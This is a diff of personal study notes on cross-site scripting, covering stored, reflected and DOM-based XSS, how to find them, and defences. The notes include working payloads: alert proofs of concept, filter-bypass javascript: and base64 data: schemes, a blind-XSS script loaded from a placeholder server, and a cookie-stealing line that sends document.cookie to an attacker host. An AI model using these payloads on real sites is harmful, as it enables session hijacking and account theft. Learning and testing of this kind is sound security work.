@@ -1,96 +1,6 @@
-# TODO: add a section for all HTML tags and how they could be used
-
-then examples of everything.
-instead of taking notes of all the payloads and all, add them to a automation and take note of the philosophy.
-
-
-[[XSS html tags]]
-# `script`
-
-
-* inline script: embedded in the html
-* loaded from separate files `<script src="URL_OF_EXTERNAL_SCRIPT"></script>`
-
-example: 
-
-if the attacker injects this code in victim's browser, unpon visiting, victim
-sends a GET request to the attacker's machine:
-
-```js
-<script>image = new Image();image.src='http://attacker_server_ip/?c='+document.cookie;</script>
-```
-
-## HUNT
-
-* check for reflected user input
-* look for scripts
-* use console and debugger
-* test every input
-* send a combination of characters `abc ' " } < > ; // # - ()` to see how they are handled.
-
-1. look for input opportunities:
-
-* you might be able to edit the *request* parameters, even if there there isn't
-  an input method on the website.
-
-DOM or reflected:
-
-* user input in URL parameters, fragments, pathnames that are displayed to the
-  user.
-* insert a custom string into each URL parameter and search the source code in
-  the return page to see if it's reflected.
-
-2. Insert payload:
-
-* `<script>alert('XSS by Vickie');</script>` doesn't work on updated
-  stuff.
-
-* using event attributes:
-
-`onload` : runs a script after the html element has loaded.
-others: (`onclick`, `onerrorr`) 
-
-* using  `<img>` tags:
-
-`<img onload=alert('the image has been loaded!') src="example.png">`
-
-* special URL schemes:
-
-`javascript:alert('XSS by Vickie)` like: `<iframe src=javascript:alert(1)>`
-
-`data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"`
-the same alert in base64 to bypass filters.
-
-* iframe
-
-more test:
-
-Insert a string of special HTML characters often used in XSS payloads, such as
-the following: >'<"//:=;!--. Take note of which ones the application escapes
-and which get rendered directly. Then you can construct test XSS payloads from
-the characters that you know the application isn’t properly sanitizing.
-
-BLIND XSS:
-
-try making the victim’s browser generate a request to a server you own:
-`<script src='http://YOUR_SERVER_IP/xss'></script>`
-If you see a request to the path /xss, a blind XSS has been triggered!
-
-----
-
-# defenses against XSS
-
-* regex to ban script tags
-* CSP ([[content security policy]]) rules
-
-monitoring the input:
-* validating: whether it's malicious
-* sanitizing: changes part of it before further processing
-
-POC:
-`<script>alert('XSS by Vickie');</script>`
-
 # XSS
+
+* instead of taking notes of all the payloads and all, add them to a automation and take note of the philosophy.
 
 taking advantage of web applications executing scripts on user's browsers.
 
@@ -107,22 +17,21 @@ Occur as a result of improperly sanitized user input being embedded in the UI/ D
 
 XSS attacks can obtain any type of data present in the current web application.
 
-## XSS types:
+# XSS types:
 
-  * Stored: the malicious script is first stored in the website's database, then
-  executed. (in database)
-  
-  * Reflected: the malicious script originates from the current HTTP request
-  reflected by a server. (in request and reflected by server)
-	
-  * DOM-based: the vulnerability exists in client-side code (the browser) and is executed there. (stored and executed in the browser)
+* stored: the malicious script is first stored in the website's database, then executed. (in
+  database)
+* Reflected: the malicious script originates from the current HTTP request reflected by a
+  server. (in request and reflected by server)
+* DOM-based: the vulnerability exists in client-side code (the browser) and is executed
+  there. (stored and executed in the browser)
 
 ## stored:
 
 app receives data, stores it in the database and and unsafely includes it in
 it's *later* HTTP response.
 
-EX: 
+EX:
 
 1. if this payload is embedded in a comment, victim just have to visit the page.
 
@@ -132,34 +41,33 @@ or it could be in a request:
 `postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net`
 
 2. if there is an XSS payload in the title of a video or article in the front page of the site, it would effect people visiting it.
-	
-### examin
 
-test all relevant *entry points* and all *exit points*
+EXAMINE:
 
+1. test all relevant *entry points* and all *exit points*
   * Entry points:
     * Parameters or other data within the URL query string and message body.
-    * The URL file path. 
+    * The URL file path.
     * HTTP request headers
     * out-of-band routes via which an attacker can deliver data into the application:
       * emails into a webmail app
-  
+
   * exit points:
     * all possible HTTP responses (to any kind of application user in any situation)
     * audit logs (visible to some application user)
 
-locate the links between entry and exit points.
+2. locate the links between entry and exit points.
+  * work through entry points, submit a specific value into each one, and monitor the apps
+    responses where the submitted values appears.
 
-  * work through entry points, submit a specific value into each one, and monitor
-    the apps responses where the submitted values appears.
-    
     Determine if the observed value is stored in different request or simply reflected.
 
-test for a vulnerability:
-
-  * determine the context within the response where the stored data appears and test appropriate payloads.
+3. test for a vulnerability:
+  * determine the context within the response where the stored data appears and test
+    appropriate payloads.
 
   with the same methodology as reflected XSS.
+
 ## reflected:
 
 app receives an http request and includes the data in it's *immediate* response.
@@ -182,33 +90,38 @@ EXPLOIT:
 * send a malicious link and somehow send it to the victim (via email, or ad for example)
 * placing links on a website controlled by attacker.
 
-### examin
+EXAMINE:
 
-test every entry point within http requests:
-  * parameters
+1. look for every entry point/ input opportunity within http requests:
+  * message body
+  * headers
   * URL :
+    * fragments
+    * parameters
     * query string
-    * message body
     * file path
-  * http headers
+  * you might be able to edit the *request* parameters, even if there there isn't an input
+    method on the website.
 
-submit random values:
+2. submit random values:
   * determine if it's reflected in the response
   * it should be short and only alphanumeric to survive input validations
 
-determine the reelection context (where is it reflected):
+3. determine the reelection context (where is it reflected):
   * between html tags
   * within a quoted tag attribute
   * a JavaScript string
   or ...
 
-test a payload:
+4. insert a payload:
+  * send a combination of characters `abc ' " } < > ; // # - ()` to see how they are
+    handled.
+  * Take note of which ones the application escapes and which get rendered directly.
   * based on the context
   * to trigger JavaScript execution
-  * keep the random value, then insert the payload before or after it, so you
-    can find it by searching the random value.
-    * `<script>alert(1)</script>abc123xyz`, `abc123xyz<script>alert(1)</script>`
-
+  * keep the random value, then insert the payload before or after it, so you can find it by
+    searching the random value in the page source.
+  * `<script>alert(1)</script>abc123xyz`, `abc123xyz<script>alert(1)</script>`
 
 ## DOM-based cross-site scripting:
 
@@ -217,9 +130,11 @@ Document object model, is the method browsers use to render a web page;
   * elements have their own properties
   * stuff are manipulated with JS.
 
-`var search = document.getElementById('search').value;
+```js
+var search = document.getElementById('search').value;
 var results = document.getElementById('results');
-results.innerHTML = 'You searched for: ' + search;`
+results.innerHTML = 'You searched for: ' + search;
+```
 
 when a website contains JavaScript that takes an attacker-controllable value,
 known as a *source*, and passes it into a dangerous function, known as a *sink*.
@@ -232,12 +147,12 @@ on that input.
 
 not all sources work with every sinks:
 
-innerHTML() extracts the html contents of an element.
+`innerHTML()` extracts the html contents of an element.
 and doesn't accept script; so use img, onload, onerror.
 when an application contains some client-side JavaScript that processes data
 from an untrusted source in an unsafe way.
 
-### examine
+EXAMINE:
 
 #### test html sinks
 
@@ -877,8 +792,6 @@ origin verifications could be flawed.
 
 `indexOf()`, `startWith()`, `endsWith()` methods are unsafe.
 
-#### 
-
 ```js
 window.addEventListener('message', function(e) {
     var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
@@ -962,3 +875,58 @@ this is actually straight forward:
 then after we take the user's cookie, we will simply add it into a request to the account.
 
 * you can use `john the ripper` to find the hashed values and specify the algorithm using: `--format=raw-md5`
+
+# possible defenses against XSS
+
+* regex to ban script tags
+* CSP ([[content security policy]]) rules
+
+monitoring the input:
+* validating: whether it's malicious
+* sanitizing: changes part of it before further processing
+
+POC:
+`<script>alert('XSS by Vickie');</script>`
+
+# XSS html tags
+
+## `script`
+
+* inline script: embedded in the html
+* loaded from separate files `<script src="URL_OF_EXTERNAL_SCRIPT"></script>`
+
+EX:
+
+if the attacker injects this code in victim's browser, unpon visiting, victim
+sends a GET request to the attacker's machine:
+
+```js
+<script>image = new Image();image.src='http://attacker_server_ip/?c='+document.cookie;</script>
+```
+
+## `<img>`
+
+EX:
+
+`<img onload=alert('the image has been loaded!') src="example.png">`
+
+## `iframe`
+
+# HTML attributes
+
+* `onload`
+* `onclick`
+* `onerrorr`
+
+# special URL schemes:
+
+`javascript:alert('XSS by Vickie)` like: `<iframe src=javascript:alert(1)>`
+
+`data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"`
+the same alert in base64 to bypass filters.
+
+# BLIND XSS:
+
+try making the victim’s browser generate a request to a server you own:
+`<script src='http://YOUR_SERVER_IP/xss'></script>`
+If you see a request to the path /xss, a blind XSS has been triggered!
